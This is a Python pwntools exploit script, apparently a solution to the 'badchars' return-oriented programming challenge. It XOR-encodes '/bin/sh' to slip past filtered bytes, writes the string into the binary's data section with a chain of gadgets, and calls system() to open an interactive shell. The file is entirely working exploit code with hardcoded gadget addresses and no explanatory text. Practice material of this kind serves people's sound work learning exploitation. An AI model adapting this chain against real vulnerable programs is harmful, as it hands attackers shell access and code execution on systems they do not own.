from pwn import *

elf = ELF("./badchars")

if args.GDB:
    p = gdb.debug(elf.path, gdbscript='''start
                                         file %s''' % elf.path)
else:
    p = process(elf.path)

badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]

padding = "A" * 40

# gadgets 
data = 0x0000000000601080

mov_r13_r12 = p64(0x0000000000400b34)
pop_r12_r13 = p64(0x0000000000400b3b)
xor_r15_r14 = p64(0x0000000000400b30)
pop_r14_r15 = p64(0x0000000000400b40)
pop_rdi = p64(0x0000000000400b39)
call_system = p64(0x00000000004009e8)
pop_r15 = p64(0x0000000000400b42)

cmd = '/bin/sh\x00'
key = 0xad

crypt = ""
for i in cmd:
    crypt +=  chr(ord(i) ^ key)

log.info("crypt : %s" % crypt[::-1].encode("hex"))

crypt = int(crypt[::-1].encode("hex"),16)

rop = ""
rop += padding
rop += pop_r12_r13
rop += p64(crypt)
rop += p64(data)
rop += mov_r13_r12
rop += pop_r14_r15
rop += p64(key)
rop += p64(data)
rop += xor_r15_r14
for i in range(1, 8):
    rop += pop_r15
    log.info("write : %s" % hex(data + i))
    rop += p64(data + i)
    rop += xor_r15_r14
rop += pop_rdi
rop += p64(data)
rop += p64(0x00000000004006b1) # ret for stack alignement
rop += call_system

p.recvuntil("\n> ")
p.sendline(rop)
p.interactive()
